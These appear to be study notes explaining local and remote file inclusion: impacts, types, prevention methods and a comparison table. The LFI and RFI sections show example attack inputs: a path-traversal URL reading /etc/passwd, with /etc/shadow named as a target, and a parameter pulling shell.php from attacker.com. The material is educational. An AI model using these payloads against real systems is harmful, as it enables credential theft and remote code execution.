File Inclusion is a web application vulnerability where an attacker manipulates user-controlled input to make the application load unintended files. There are two types: Local File Inclusion (LFI), which accesses files on the local server, and Remote File Inclusion (RFI), which loads files from an external server. The impact includes information disclosure and possible code execution. It can be prevented by validating user input, whitelisting allowed files, disabling remote file inclusion, and following secure coding practices.





**File Inclusion :**

* An application loads or includes files dynamically using user-controlled input without proper validation.
* Problem occurs when: user input is NOT validated, Attacker manipulates parameter.
* An application is vulnerable every time a developer uses the include functions, with an input provided by a user, without validating it.



**# Impacts of File inclusion attack:**

1\. code execution on server side

2\. code execution on client side

3\. DoS attack

4\. information disclosure



**# Types of File Inclusion:**

***1. Local file inclusion (LFI) :***

&#x20;occurs when an attacker tricks the application into loading local files from the server.

&#x20;syntax: anyparameter=somelocalfile

&#x20;example: http://172.30.124.12:9000/index.php?lang=/../../etc/passwd

&#x20;Common Files Targeted: /etc/passwd, /etc/shadow, /var/log/apache2/access.log



***2. Remote File Inclusion (RFI) :***

&#x20;occurs when an application includes files from external remote servers controlled by the attacker.

&#x20;Here attacker sends: malicious file which executes by server : ?page=http://attacker.com/shell.php

&#x20;anyparmeter=remoteweb.com/file

&#x20;example: target.com/index.php?share=http://facebook.com/status?id=12672



**# Prevention methods :**

Input validation, whitelisting allowed files, disabling remote file inclusion, proper file permissions, storing sensitive files outside the web root, and following secure coding practices.





| Local File Inclusion (LFI)                         | Remote File Inclusion (RFI)                             |

| -------------------------------------------------- | ------------------------------------------------------- |

| Includes files from the local server               | Includes files from an external server                  |

| Used to access local configuration or system files | May allow execution of attacker-controlled code         |

| Limited to files present on the server             | Requires the application to allow remote file inclusion |



